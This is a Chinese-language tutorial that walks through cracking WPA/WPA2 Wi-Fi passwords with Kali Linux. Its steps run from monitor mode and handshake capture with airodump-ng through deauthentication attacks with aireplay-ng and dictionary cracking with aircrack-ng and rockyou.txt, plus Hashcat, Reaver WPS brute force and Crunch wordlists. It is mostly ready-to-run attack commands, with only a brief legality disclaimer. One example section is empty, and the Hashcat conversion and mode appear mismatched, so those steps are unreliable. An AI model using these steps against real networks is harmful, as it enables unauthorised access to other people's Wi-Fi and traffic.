下面是一个更详细的**Kali Linux Wi-Fi 破解教程**，包括各个步骤的详细解释。此教程用于合法的渗透测试和网络安全评估，请不要用于非法活动。

### 一、准备工作
1. **安装 Kali Linux**：
   
   - 下载最新的 [Kali Linux](https://www.kali.org/get-kali/) ISO 镜像文件，并将其安装在虚拟机或物理机上。
   - 安装时，选择完整安装，确保网络安全工具包括 `aircrack-ng` 套件。
   
2. **硬件要求**：
   
   - **无线网卡**：必须支持**监控模式**和**包注入**，推荐使用像 Alfa AWUS036NH 之类的高性能网卡。
   
3. **更新 Kali Linux**：
   
   - 确保系统和工具是最新的：
   ```bash
   sudo apt update && sudo apt upgrade -y
   ```

### 二、工具概述
- **Aircrack-ng**：这是一个用于网络监控、捕获数据包、密钥破解的 Wi-Fi 破解工具集。
- **Airmon-ng**：将无线网卡置于监控模式。
- **Airodump-ng**：用于捕获 Wi-Fi 网络的数据包。
- **Aireplay-ng**：注入网络包进行干扰或欺骗攻击，常用于解除客户端的连接（deauth）。
- **Aircrack-ng**：通过字典破解捕获到的握手包，获取 Wi-Fi 密码。

### 三、详细步骤

#### 1. 将无线网卡切换为监控模式

Kali Linux 默认网卡工作在管理模式下（不捕获流量）。使用 `airmon-ng` 启动监控模式：
```bash
sudo airmon-ng start wlan0
```
- `wlan0` 是你的无线网卡接口名称，可以通过 `ifconfig` 查看。
- 如果看到错误提示与进程冲突，可使用以下命令杀死冲突进程：
  ```bash
  sudo airmon-ng check kill
  ```

#### 2. 扫描周围的 Wi-Fi 网络

使用 `airodump-ng` 来扫描周围的 Wi-Fi 网络：
```bash
sudo airodump-ng wlan0mon
```
此命令会显示：
- BSSID：路由器的 MAC 地址。
- PWR：信号强度。
- CH：信道（Channel）。
- ENC：加密类型（如 WPA、WPA2）。
- ESSID：Wi-Fi 网络名称。

![截图_2024-09-27_13-32-23](./assets/截图_2024-09-27_13-32-23.png)

#### 3. 选择目标 Wi-Fi 网络并捕获握手包

找到目标 Wi-Fi 网络后，记下其 BSSID 和信道，然后运行以下命令开始捕获握手包：
```bash
sudo airodump-ng --bssid [目标BSSID] --channel [信道] -w [保存文件名] wlan0mon
```
- `--bssid` 后跟目标 Wi-Fi 的 BSSID。
- `--channel` 后跟信道号。
- `-w` 表示保存握手包的文件名。

例子：

```bash
sudo airodump-ng --bssid D4:62:EA:5E:9B:A0 --channel 6 -w /home/kali/Desktop/wsb/ wlan0mon
```

![截图_2024-09-27_14-04-58](./assets/截图_2024-09-27_14-04-58.png)

这个命令会捕获目标 Wi-Fi 网络上的数据包，直到捕获到握手包。



#### 4. 强制客户端重新连接（Deauthentication 攻击）

> [!CAUTION]
>
> 不要关闭捕获握手包，重新开一个窗口进行攻击

如果在捕获过程中没有用户连接到 Wi-Fi 或没有获取到握手包，可以使用 `aireplay-ng` 发送断开（deauth）请求，强制客户端重新连接，以便捕获握手包：
```bash
sudo aireplay-ng --deauth 10 -a [路由器mac地址] -c [客户端mac地址] wlan0mon
```
- `--deauth 10` 意思是发送 10 个 deauth 包，10 是可调的数字，代表包的数量。
- `-a` 路由器mac地址 。
- ` -c` 客户端mac地址。

例子：



#### 5. 检查是否成功捕获握手包

当客户端重新连接时，`airodump-ng` 窗口的右上角会提示 `WPA handshake: [目标BSSID]`，表示已成功捕获握手包。握手包会保存在你指定的 `.cap` 文件中。

![捕获握手包成功](./assets/捕获握手包成功.png)

#### 6. 使用字典文件破解 Wi-Fi 密码

握手包捕获完成后，接下来使用 `aircrack-ng` 工具来破解 Wi-Fi 密码。你需要一个包含常见密码的字典文件。网络上有很多常用的字典文件，推荐使用 `rockyou.txt`，它通常位于 `/usr/share/wordlists/` 中：
```bash
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [目标BSSID] [捕获文件名].cap
```
- `-w` 后跟字典文件的路径。
- `-b` 后跟目标 Wi-Fi 的 BSSID。
- `捕获文件名.cap` 是你之前保存的握手包文件。

破解过程可能需要一些时间，具体取决于密码的复杂性和字典文件的大小。

#### 7. 破解成功

如果目标 Wi-Fi 的密码在字典文件中，`aircrack-ng` 将输出 Wi-Fi 密码。你可以使用该密码连接到 Wi-Fi 网络。

![截图_2024-09-27_15-03-39](./assets/截图_2024-09-27_15-03-39.png)

### 四、进阶工具和技巧

1. **Hashcat**：
   Hashcat 是一个更强大的密码破解工具，它支持 GPU 加速，可以大幅加快破解速度。使用 Hashcat 破解 WPA2 密码需要将 `.cap` 文件转换为 Hashcat 支持的格式：
   
   ```bash
   hcxpcapngtool -o hashcat.hccapx [捕获文件名].cap
   ```
   然后使用 Hashcat 进行破解：
   ```bash
   hashcat -m 2500 hashcat.hccapx /path/to/wordlist.txt
   ```
   
2. **Reaver（针对 WPS 漏洞）**：
   如果目标 Wi-Fi 网络启用了 WPS 功能，你可以使用 `Reaver` 工具来尝试暴力破解 WPS PIN，从而绕过 WPA/WPA2 加密：
   ```bash
   sudo reaver -i wlan0mon -b [目标BSSID] -vv
   ```
   这个方法对于没有禁用 WPS 的路由器特别有效。

3. **字典生成器**：
   如果默认字典文件不足以破解密码，可以使用 `Crunch` 工具来生成符合特定模式的字典文件：
   ```bash
   crunch 8 10 abcdefghijklmnopqrstuvwxyz -o custom_wordlist.txt
   ```
   该命令生成一个由 8 到 10 位的小写字母组成的字典文件。

### 五、重要的注意事项

1. **合法性**：
   你必须对目标网络拥有明确的授权。未经授权的 Wi-Fi 渗透测试是非法的，可能导致严重的法律后果。

2. **加密方式**：
   使用 WPA3 加密的网络非常难以破解，目前没有有效的公开方法来破解 WPA3。

3. **复杂性**：
   破解时间取决于密码的复杂性和字典的质量。较强的密码可能需要很长时间甚至无法破解。

以上是一个较为详细的 Kali Linux 破解 Wi-Fi 的教程，主要目的是为了教育和网络安全测试。如果你对网络安全感兴趣，可以深入学习更多合法的渗透测试方法和技术。